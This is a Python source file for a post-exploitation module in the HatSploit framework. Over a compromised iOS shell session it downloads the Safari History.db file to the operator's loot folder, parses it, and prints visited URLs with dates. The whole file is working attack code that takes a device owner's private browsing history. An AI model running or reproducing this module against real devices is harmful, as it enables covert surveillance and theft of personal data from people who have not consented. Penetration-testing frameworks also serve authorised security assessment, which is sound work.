"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.loot import Loot
from hatsploit.lib.core.module.basic import *

from pex.db import DB


class HatSploitModule(Module):
    def __init__(self):
        super().__init__({
            'Category': "post",
            'Name': "Obtain Safari history",
            'Module': "post/apple_ios/shell/safari_history",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
            ],
            'Description': "Get iOS Safari history database and parse it.",
            'Platform': OS_IPHONE,
            'Rank': MEDIUM_RANK,
        })

        self.session = SessionOption('SESSION', None, "Session to run on.", True,
                                     platforms=[OS_IPHONE], type='shell')
        self.path = Option('PATH', Loot().specific_loot('History.db'), "Path to save file.", True)

    def run(self):
        history = '/private/var/mobile/Library/Safari/History.db'
        path = self.session.session.download(history, self.path.value)

        if path:
            self.print_process("Parsing history database...")

            try:
                history = DB().parse_safari_history(path)
            except Exception:
                self.print_error("Failed to parse history database!")
                return

            history_data = []
            for item in history:
                history_data.append((item['date'], item['details']['url']))

            if history_data:
                self.print_table("History", ('Date', 'URL'), *history_data)
            else:
                self.print_warning("No history available on device.")
